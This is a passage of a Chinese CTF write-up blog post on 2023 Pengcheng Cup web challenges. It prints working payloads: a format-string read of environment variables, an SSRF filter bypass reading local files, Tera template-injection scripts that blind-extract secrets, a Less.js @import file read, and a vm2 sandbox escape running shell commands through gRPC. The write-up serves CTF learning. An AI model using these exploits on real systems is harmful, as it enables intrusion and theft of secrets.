+<div class="code-wrapper"><pre><code class="hljs asciidoc">username=&#123;passhash.<span class="hljs-emphasis">__str__</span>.<span class="hljs-emphasis">__globals__</span>[app].wsgi_app.<span class="hljs-emphasis">__globals__</span>[os].environ&#125;&amp;password=1</code></pre></div>
+
+<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>这没办法，要是做题肯定不会，只能看看WP了</p>
+<p>扫描发现</p>
+<div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.10</span>.<span class="hljs-number">0.3</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/swagger-ui/i</span>ndex.html</code></pre></div>
+
+<p>只有一个api，可以进行ssrf，先<a target="_blank" rel="noopener" href="http://x.x.xx./%E5%88%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E5%8F%91%E7%8E%B0user-agent%E4%B8%AD%E6%9C%89java%E7%89%88%E6%9C%AC%EF%BC%8C%E7%8C%9C%E6%B5%8B%E6%98%AF%E9%80%9A%E8%BF%87URL%E7%B1%BB%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82%E3%80%82%E4%BD%BF%E7%94%A8ftp%E4%B9%9F%E8%83%BD%E6%AD%A3%E5%B8%B8%E8%8E%B7%E5%8F%96%E5%86%85%E5%AE%B9%EF%BC%8C%E4%BD%86%E6%98%AF%E4%BD%BF%E7%94%A8file%E7%9A%84%E6%97%B6%E5%80%99%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%EF%BC%8C%E8%B0%83%E8%AF%95URL%E7%B1%BB%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87%E7%9A%84%E7%82%B9">http://x.x.xx./到自己的云服务器，发现user-agent中有java版本，猜测是通过URL类发起请求。使用ftp也能正常获取内容，但是使用file的时候被过滤了，调试URL类，发现可以利用绕过的点</a></p>
+<div class="code-wrapper"><pre><code class="hljs crmsh">if (<span class="hljs-keyword">spec</span>.regionMatches(<span class="hljs-literal">true</span>, <span class="hljs-literal">start</span>, <span class="hljs-string">&quot;url:&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>)) &#123;
+                <span class="hljs-literal">start</span> += <span class="hljs-number">4</span>;
+            &#125;</code></pre></div>
+
+<p>在url以url:开头时，直接跳过，紧接着的是对#符号的处理</p>
+<div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">start</span> &lt; spec.length() &amp;&amp; spec.charAt(<span class="hljs-keyword">start</span>) == <span class="hljs-string">&#x27;#&#x27;</span>) &#123;
+                <span class="hljs-comment">/* we&#x27;re assuming this is a ref relative to the context URL.</span>
+<span class="hljs-comment">                 * This means protocols cannot start w/ &#x27;#&#x27;, but we must parse</span>
+<span class="hljs-comment">                 * ref URL&#x27;s like: &quot;hello:there&quot; w/ a &#x27;:&#x27; in them.</span>
+<span class="hljs-comment">                 */</span>
+                aRef=<span class="hljs-keyword">true</span>;
+            &#125;</code></pre></div>
+
+<p>利用这个点可以绕过仅.html限制，读取flag</p>
+<div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.10</span>.<span class="hljs-number">0.3</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/proxy/u</span>rl?url=url:file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/flag%23a.html</span></code></pre></div>
+
+<blockquote>
+<p>&#x2F;proxy&#x2F;url 存在 ssrf, 过滤了 <code>file://</code> <code>netdoc://</code> 等协议</p>
+<p>使用 <code>url:file://</code> 绕过, 再传一个 query string 绕过 <code>Only html can be viewed</code> 限制</p>
+<div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-regexp">/proxy/u</span>rl?url=url:<span class="hljs-keyword">file</span>:<span class="hljs-comment">///flag?html</span></code></pre></div>
+</blockquote>
+<h2 id="Tera"><a href="#Tera" class="headerlink" title="Tera"></a>Tera</h2><p>当时题目描述写了ssti，我就在bing上搜索<code>tera ssti</code>，结果啥都没有</p>
+<p>赛后看lolita做出来了，问他是怎样信息搜集的，他说主要是看文档，（大佬都是这样呜呜呜）</p>
+<p>他也说<code>tera ssti</code>，只是用的是chrome，我用chrome一搜，直接就找到相关文章了。。。。。。。</p>
+<p>tera实际上是Rust的模板引擎</p>
+<p><code>tera A powerful, fast and easy-to-use template engine for Rust</code></p>
+<p>看了三个payload</p>
+<p>有三个主要部分，绕过<code>flag</code>的过滤，利用get_env获取环境变量中的flag值，利用if语句对flag值进行盲注</p>
+<p>区别就是具体实现不同</p>
+<p>直接给出来吧，感觉没啥好说的，这种题还得是做到时具体看文档   </p>
+<p><a target="_blank" rel="noopener" href="https://keats.github.io/tera/docs/#built-ins">Tera (keats.github.io)</a></p>
+<div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>不报错，说明环境变量中存在flag变量
+&#123;% set fla=[<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>]|join(sep=<span class="hljs-string">&quot;&quot;</span>) %&#125;
+&#123;% set fla1 = get_env(name=fla) %&#125;
+
+
+<span class="hljs-regexp">//</span>利用reverse反转字符串，然后在<span class="hljs-keyword">if</span>语句中使用starting_with，若正确回显ok，盲注出flag
+import requests
+
+flag = <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789abcdef-&#123;&#125;&quot;</span>:
+        postdata = <span class="hljs-string">&quot;&quot;&quot;&#123;% set f=&#x27;galf&#x27;|reverse %&#125;&#123;% set f1 = get_env(name=f)|reverse %&#125;&#123;% if f1 is starting_with(&#x27;&quot;&quot;&quot;</span> + flag + i + <span class="hljs-string">&quot;&quot;&quot;&#x27;) %&#125;ok&#123;% endif %&#125;&quot;&quot;&quot;</span>
+        res = requests.post(<span class="hljs-string">&quot;http://172.10.0.3:8081/&quot;</span>, postdata).text
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ok&quot;</span> <span class="hljs-keyword">in</span> res:
+            flag += i
+            print(flag)
+            <span class="hljs-keyword">break</span>
+            
+            
+反转一下套上flag标签即可
+<span class="hljs-regexp">//</span>。。。要反转的话get_env后面不加reverse不就行了吗</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;http://172.10.0.3:8081/&quot;</span>
+
+headers = &#123;
+  <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>
+&#125;
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>:
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        <span class="hljs-keyword">try</span>:
+            payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-string">&#123;% set AX = get_env(name=&quot;fl&quot;~&quot;ag&quot;, default=&quot;1&quot;) %&#125;    //~拼接flag</span>
+<span class="hljs-string">&#123;%- for char in AX -%&#125;</span>
+<span class="hljs-string">C                                    //计数</span>
+<span class="hljs-string">&#123;%- if char == &#x27;LOLITA&#x27; -%&#125;          //在发包时进行替换</span>
+<span class="hljs-string">h                                    //若正确回显h</span>
+<span class="hljs-string">&#123;%- else -%&#125;</span>
+<span class="hljs-string">&#123;%- endif -%&#125;</span>
+<span class="hljs-string">&#123;% endfor %&#125;</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+            response = requests.request(<span class="hljs-string">&quot;POST&quot;</span>, url, headers=headers, data=payload.replace(<span class="hljs-string">&quot;LOLITA&quot;</span>, i), timeout=(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))
+            <span class="hljs-comment">#print(response.text)</span>
+            rspt = response.text.strip()
+            <span class="hljs-built_in">print</span>(rspt)
+            cc = <span class="hljs-number">0</span>
+            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(rspt)):
+                <span class="hljs-keyword">if</span> rspt[x] == <span class="hljs-string">&#x27;C&#x27;</span>:
+                    cc += <span class="hljs-number">1</span>
+                <span class="hljs-keyword">if</span> rspt[x] == <span class="hljs-string">&#x27;h&#x27;</span>:
+                    flag[cc-<span class="hljs-number">1</span>] = i
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(flag))
+            <span class="hljs-keyword">break</span>
+        <span class="hljs-keyword">except</span>:
+            <span class="hljs-number">1</span>-<span class="hljs-number">1</span>
+</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+dicts = <span class="hljs-string">&#x27;0123456789abcdef-&#x27;</span>
+<span class="hljs-comment"># flag = &#x27;&#123;3c8ce067-4df7-66b2-843a-04c6959&#x27;</span>
+flag = <span class="hljs-string">&#x27;-04c695904159&#125;&#x27;</span>
+
+i = <span class="hljs-number">1</span>
+
+
+//replace绕过flag的匹配，在<span class="hljs-keyword">if</span>语句中使用starting_with，若正确回显true，盲注出flag
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;testing&#x27;</span>, s)
+        url = <span class="hljs-string">&#x27;http://172.10.0.3:8081/&#x27;</span>
+        <span class="hljs-comment"># data = r&#x27;&#123;% set my_var = get_env(name=&quot;flac&quot;|replace(from=&quot;c&quot;, to=&quot;g&quot;)) %&#125;&#123;% if my_var is starting_with(&quot;AAAg&#x27; + flag + s + &#x27;&quot;|replace(from=&quot;AAA&quot;, to=&quot;fla&quot;)) %&#125;true&#123;% else %&#125;false&#123;% endif %&#125;&#x27;</span>
+        data = <span class="hljs-string">r&#x27;&#123;% set my_var = get_env(name=&quot;flac&quot;|replace(from=&quot;c&quot;, to=&quot;g&quot;)) %&#125;&#123;% if my_var is ending_with(&quot;&#x27;</span> + s + flag + <span class="hljs-string">&#x27;&quot;) %&#125;true&#123;% else %&#125;false&#123;% endif %&#125;&#x27;</span>
+        <span class="hljs-comment"># print(data)</span>
+        res = requests.post(url, data=data)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;forbidden&#x27;</span> <span class="hljs-keyword">in</span> res.text:
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;forbidden&#x27;</span>)
+            exit()
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;true&#x27;</span> <span class="hljs-keyword">in</span> res.text:
+            <span class="hljs-comment"># flag += s</span>
+            flag = s + flag
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;found!!!&#x27;</span>, flag)
+            <span class="hljs-keyword">break</span>
+    i += <span class="hljs-number">1</span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs maxima">flag&#123;3c8ce067-4df7-<span class="hljs-number">66b2</span>-843a-<span class="hljs-number">04c695904159</span>&#125;</code></pre></div>
+
+<h2 id="simple-rpc"><a href="#simple-rpc" class="headerlink" title="simple_rpc"></a>simple_rpc</h2><p>访问自动跳转</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.10.0.6:3000</span>/find_rpc?less=h5%<span class="hljs-number">7</span>Bcolor:red%<span class="hljs-number">7</span>D</code></pre></div>
+
+<p>搜了一下<code>less=h5%7Bcolor:red%7D</code>好像是Less.js用于CSS扩展</p>
+<p>提示要读取rpc.js，找官方文档，有@import可以用 <a target="_blank" rel="noopener" href="https://less.bootcss.com/features/#import-at-rules-inline">https://less.bootcss.com/features/#import-at-rules-inline</a> 用inline选项可以原样导入文本，读取rpc.js和package.json</p>
+<p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115211141073.png" srcset="/img/loading.gif" lazyload alt="image-20240115211141073"></p>
+<div class="code-wrapper"><pre><code class="hljs fallback">/find_rpc?less=h5&#123;@import%20(inline)%20&#x27;rpc.js&#x27;;&#125;
+/find_rpc?less=h5&#123;@import%20(inline)%20&#x27;eval.proto&#x27;;&#125;
+/find_rpc?less=h5&#123;@import%20(inline)%20&#x27;app.js&#x27;;&#125;
+/find_rpc?less=h5&#123;@import%20(inline)%20&#x27;package.json&#x27;;&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">//rpc.js</span>
+
+<span class="hljs-keyword">var</span> <span class="hljs-variable constant_">PROTO_PATH</span> = __dirname + <span class="hljs-string">&#x27;/eval.proto&#x27;</span>;
+<span class="hljs-keyword">const</span> &#123;<span class="hljs-variable constant_">VM</span>&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);
+<span class="hljs-keyword">var</span> grpc = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@grpc/grpc-js&#x27;</span>);
+<span class="hljs-keyword">var</span> protoLoader = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@grpc/proto-loader&#x27;</span>);
+<span class="hljs-keyword">var</span> packageDefinition = protoLoader.<span class="hljs-title function_">loadSync</span>(
+    <span class="hljs-variable constant_">PROTO_PATH</span>,
+    &#123;<span class="hljs-attr">keepCase</span>: <span class="hljs-literal">true</span>,
+        <span class="hljs-attr">longs</span>: <span class="hljs-title class_">String</span>,
+        <span class="hljs-attr">enums</span>: <span class="hljs-title class_">String</span>,
+        <span class="hljs-attr">defaults</span>: <span class="hljs-literal">true</span>,
+        <span class="hljs-attr">oneofs</span>: <span class="hljs-literal">true</span>
+    &#125;);
+<span class="hljs-keyword">var</span> hello_proto = grpc.<span class="hljs-title function_">loadPackageDefinition</span>(packageDefinition).<span class="hljs-property">helloworld</span>;
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">evalTemplate</span>(<span class="hljs-params">call, callback</span>) &#123;
+    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>();
+    <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, &#123;<span class="hljs-attr">message</span>:    vm.<span class="hljs-title function_">run</span>(call.<span class="hljs-property">request</span>.<span class="hljs-property">template</span>) &#125;);
+&#125;
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;
+    <span class="hljs-keyword">var</span> server = <span class="hljs-keyword">new</span> grpc.<span class="hljs-title class_">Server</span>();
+    server.<span class="hljs-title function_">addService</span>(hello_proto.<span class="hljs-property">Demo</span>.<span class="hljs-property">service</span>, &#123;<span class="hljs-attr">evalTemplate</span>: evalTemplate&#125;);
+    server.<span class="hljs-title function_">bindAsync</span>(<span class="hljs-string">&#x27;0.0.0.0:8082&#x27;</span>, grpc.<span class="hljs-property">ServerCredentials</span>.<span class="hljs-title function_">createInsecure</span>(), <span class="hljs-function">() =&gt;</span> &#123;
+        server.<span class="hljs-title function_">start</span>();
+    &#125;);
+&#125;
+
+<span class="hljs-title function_">main</span>()</code></pre></div>
+
+<p><img src="/../images/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20240115212744307.png" srcset="/img/loading.gif" lazyload alt="image-20240115212744307"></p>
+<div class="code-wrapper"><pre><code class="hljs protobuf"><span class="hljs-comment">//eval.proto</span>
+
+syntax = <span class="hljs-string">&quot;proto3&quot;</span>;
+
+<span class="hljs-keyword">package</span> helloworld;
+
+<span class="hljs-keyword">service </span><span class="hljs-title class_">Demo</span> &#123;
+  <span class="hljs-function"><span class="hljs-keyword">rpc</span> evalTemplate (TemplateRequest) <span class="hljs-keyword">returns</span> (Reply) </span>&#123;&#125;
+&#125;
+
+<span class="hljs-keyword">message </span><span class="hljs-title class_">TemplateRequest</span> &#123;
+  <span class="hljs-type">string</span> template = <span class="hljs-number">1</span>;
+&#125;
+
+<span class="hljs-keyword">message </span><span class="hljs-title class_">Reply</span> &#123;
+  <span class="hljs-type">string</span> message = <span class="hljs-number">1</span>;
+&#125;</code></pre></div>
+
+<p>就是一个简单的请求与响应</p>
+<div class="code-wrapper"><pre><code class="hljs perl">&#123;
+  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;confuse&quot;</span>,
+  <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;1.0.0&quot;</span>,
+  <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
+  <span class="hljs-string">&quot;main&quot;</span>: <span class="hljs-string">&quot;app.js&quot;</span>,
+  <span class="hljs-string">&quot;scripts&quot;</span>: &#123;
+    <span class="hljs-string">&quot;test&quot;</span>: <span class="hljs-string">&quot;node app.js&quot;</span>
+  &#125;,
+  <span class="hljs-string">&quot;author&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
+  <span class="hljs-string">&quot;license&quot;</span>: <span class="hljs-string">&quot;ISC&quot;</span>,
+  <span class="hljs-string">&quot;dependencies&quot;</span>: &#123;
+    <span class="hljs-string">&quot;express&quot;</span>: <span class="hljs-string">&quot;^4.17.1&quot;</span>,
+    <span class="hljs-string">&quot;vm2&quot;</span>: <span class="hljs-string">&quot;3.9.15&quot;</span>,
+    <span class="hljs-string">&quot;acorn&quot;</span>: <span class="hljs-string">&quot;^8.8.2&quot;</span>,
+    <span class="hljs-string">&quot;@grpc/grpc-js&quot;</span>: <span class="hljs-string">&quot;^1.9.0&quot;</span>,
+    <span class="hljs-string">&quot;@grpc/proto-loader&quot;</span>: <span class="hljs-string">&quot;^0.7.8&quot;</span>,
+    <span class="hljs-string">&quot;less&quot;</span>: <span class="hljs-string">&quot;^4.2.0&quot;</span>
+  &#125;</code></pre></div>
+
+<p>vm2该版本存在逃逸漏洞<a target="_blank" rel="noopener" href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</a></p>
+<div class="code-wrapper"><pre><code class="hljs coffeescript">const code = `<span class="language-javascript"></span>
+<span class="language-javascript">err = &#123;&#125;;</span>
+<span class="language-javascript"><span class="hljs-keyword">const</span> handler = &#123;</span>
+<span class="language-javascript">    <span class="hljs-title function_">getPrototypeOf</span>(<span class="hljs-params">target</span>) &#123;</span>
+<span class="language-javascript">        (<span class="hljs-keyword">function</span> <span class="hljs-title function_">stack</span>(<span class="hljs-params"></span>) &#123;</span>
+<span class="language-javascript">            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>().<span class="hljs-property">stack</span>;</span>
+<span class="language-javascript">            <span class="hljs-title function_">stack</span>();</span>
+<span class="language-javascript">        &#125;)();</span>
+<span class="language-javascript">    &#125;</span>
+<span class="language-javascript">&#125;;</span>
+<span class="language-javascript">  </span>
+<span class="language-javascript"><span class="hljs-keyword">const</span> proxiedErr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(err, handler);</span>
+<span class="language-javascript"><span class="hljs-keyword">try</span> &#123;</span>
+<span class="language-javascript">    <span class="hljs-keyword">throw</span> proxiedErr;</span>
+<span class="language-javascript">&#125; <span class="hljs-keyword">catch</span> (&#123;<span class="hljs-attr">constructor</span>: c&#125;) &#123;</span>
+<span class="language-javascript">    c.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;touch pwned&#x27;</span>);</span>
+<span class="language-javascript">&#125;</span>
+<span class="language-javascript"></span>`</code></pre></div>
+
+<p>所以我们构造grpc client去与服务端进行交互即可</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">grpc</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;@grpc/grpc-js&#x27;</span>);
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">protoLoader</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;@grpc/proto-loader&#x27;</span>);
+
+<span class="hljs-keyword">var</span> PROTO_PATH = __dirname + <span class="hljs-string">&#x27;/eval.proto&#x27;</span>;
+<span class="hljs-keyword">var</span> packageDefinition = protoLoader.<span class="hljs-title function_ invoke__">loadSync</span>(
+    PROTO_PATH,
+    &#123;
+        <span class="hljs-attr">keepCase</span>: <span class="hljs-literal">true</span>,
+        <span class="hljs-attr">longs</span>: String,
+        <span class="hljs-attr">enums</span>: String,
+        <span class="hljs-attr">defaults</span>: <span class="hljs-literal">true</span>,
+        <span class="hljs-attr">oneofs</span>: <span class="hljs-literal">true</span>
+    &#125;
+);
+
+<span class="hljs-keyword">var</span> hello_proto = grpc.<span class="hljs-title function_ invoke__">loadPackageDefinition</span>(packageDefinition).helloworld;
+<span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> hello_proto.<span class="hljs-title function_ invoke__">Demo</span>(<span class="hljs-string">&#x27;172.10.0.6:8082&#x27;</span>, grpc.credentials.<span class="hljs-title function_ invoke__">createInsecure</span>());
+
+<span class="hljs-keyword">var</span> template = `err = &#123;&#125;;
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">handler</span> = &#123;
+    <span class="hljs-title function_ invoke__">getPrototypeOf</span>(target) &#123;
+        (<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stack</span>(<span class="hljs-params"></span>) </span>&#123;
+            <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>().stack;
+            <span class="hljs-title function_ invoke__">stack</span>();
+        &#125;)();
+    &#125;
+&#125;;
+  
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">proxiedErr</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(err, handler);
+<span class="hljs-keyword">try</span> &#123;
+    <span class="hljs-keyword">throw</span> proxiedErr;
+&#125; <span class="hljs-keyword">catch</span> (&#123;constructor: c&#125;) &#123;
+    c.<span class="hljs-title function_ invoke__">constructor</span>(<span class="hljs-string">&#x27;return process&#x27;</span>)().mainModule.<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_ invoke__">execSync</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>();
+&#125;`;
+
+client.<span class="hljs-title function_ invoke__">evalTemplate</span>(&#123;<span class="hljs-attr">template</span>: template&#125;, function(err, response) &#123;
+    <span class="hljs-keyword">if</span> (err) &#123;
+        console.<span class="hljs-title function_ invoke__">error</span>(err);
+        <span class="hljs-keyword">return</span>;
+    &#125;
+    console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&#x27;服务端的运算结果: &#x27;</span>, response.message);
+&#125;);</code></pre></div>
+
+<p>不会写没关系，找gpt生成一下就行</p>
+<div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> grpc = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@grpc/grpc-js&#x27;</span>);
+<span class="hljs-keyword">const</span> protoLoader = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@grpc/proto-loader&#x27;</span>);
+
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PROTO_PATH</span> = __dirname + <span class="hljs-string">&#x27;/eval.proto&#x27;</span>;
+<span class="hljs-keyword">const</span> packageDefinition = protoLoader.<span class="hljs-title function_">loadSync</span>(
+    <span class="hljs-variable constant_">PROTO_PATH</span>,
+    &#123; <span class="hljs-attr">keepCase</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">longs</span>: <span class="hljs-title class_">String</span>, <span class="hljs-attr">enums</span>: <span class="hljs-title class_">String</span>, <span class="hljs-attr">defaults</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">oneofs</span>: <span class="hljs-literal">true</span> &#125;
+);
+
+<span class="hljs-keyword">const</span> hello_proto = grpc.<span class="hljs-title function_">loadPackageDefinition</span>(packageDefinition).<span class="hljs-property">helloworld</span>;
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">evalTemplate</span>(<span class="hljs-params">template</span>) &#123;
+    <span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> hello_proto.<span class="hljs-title class_">Demo</span>(<span class="hljs-string">&#x27;localhost:8082&#x27;</span>, grpc.<span class="hljs-property">credentials</span>.<span class="hljs-title function_">createInsecure</span>());
+
+    <span class="hljs-keyword">const</span> request = &#123; template &#125;;
+
+    client.evalTemplate(request, <span class="hljs-function">(<span class="hljs-params">error, response</span>) =&gt;</span> &#123;
+        <span class="hljs-keyword">if</span> (!error) &#123;
+            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Response:&#x27;</span>, response.<span class="hljs-property">message</span>);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error);
+        &#125;
+    &#125;);
+&#125;
+
+<span class="hljs-comment">// Example usage:</span>
+evalTemplate(<span class="hljs-string">&#x27;Hello, &#123;&#123; name &#125;&#125;!&#x27;</span>);</code></pre></div>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>题目考点总体来说都是那种需要现学现用的那种，但我很难看得懂官方文档</p>
+<p>所以做题总做不出来，tera的那种看文档的话应该是属于最简单的那种了，很多方法都能用，不像别的难题在众多语句中找到要用的</p>
+<p>唉，太难了</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/2180731.html">2023第三届“鹏城杯”线上初赛WriteUp | CN-SEC 中文网</a></p>
+<p><a target="_blank" rel="noopener" href="https://exp10it.io/2023/11/2023-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/#simple_rpc">https://exp10it.io/2023/11/2023-%E9%B9%8F%E5%9F%8E%E6%9D%AF-web-writeup/#simple_rpc</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023鹏城杯-web</div>
+      <div>https://zer0peach.github.io/2024/01/15/2023鹏城杯-web/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/14/HECTF2023-web%E5%A4%8D%E7%8E%B0/" title="HECTF2023-web复现">
+                        <span class="hidden-mobile">HECTF2023-web复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
